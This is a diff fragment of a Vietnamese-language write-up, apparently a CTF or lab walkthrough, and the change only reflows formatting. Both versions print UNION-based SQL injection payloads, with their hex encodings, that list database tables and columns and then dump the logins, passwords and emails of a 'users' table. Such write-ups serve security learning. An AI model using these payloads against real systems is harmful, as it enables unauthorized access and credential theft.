@@ -84,7 +84,9 @@ Mượt luôn. Xong 90% rồi, giờ thì mình khai thác như một bài bình
 
 Tìm tên bảng:
 
-Payload injected to second query: `' union select 1, group_concat(table_name) from information_schema.tables -- ` --> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573202D2D20`
+Payload injected to second query: `' union select 1, group_concat(table_name) from information_schema.tables -- ` 
+
+--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573202D2D20`
 
 Payload: 
 ```
@@ -97,7 +99,9 @@ Payload:
 
 Tìm ra tên bảng là `users`. Giờ tìm tên cột của bảng này:
 
-Payload injected to second query: `' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- ` --> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27757365727327202D2D20`
+Payload injected to second query: `' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- ` 
+
+--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27757365727327202D2D20`
 
 Payload: 
 ```
@@ -108,7 +112,9 @@ Payload:
 
 Lấy tất cả thông tin ra.
 
-Payload injected to second query: `' union select 1, group_concat(id, ':', login, ':', password, ':', email) from users -- ` --> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E6361742869642C20273A272C206C6F67696E2C20273A272C2070617373776F72642C20273A272C20656D61696C292066726F6D207573657273202D2D20 `
+Payload injected to second query: `' union select 1, group_concat(id, ':', login, ':', password, ':', email) from users -- ` 
+
+--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E6361742869642C20273A272C206C6F67696E2C20273A272C2070617373776F72642C20273A272C20656D61696C292066726F6D207573657273202D2D20 `
 
 Payload: 
 ```
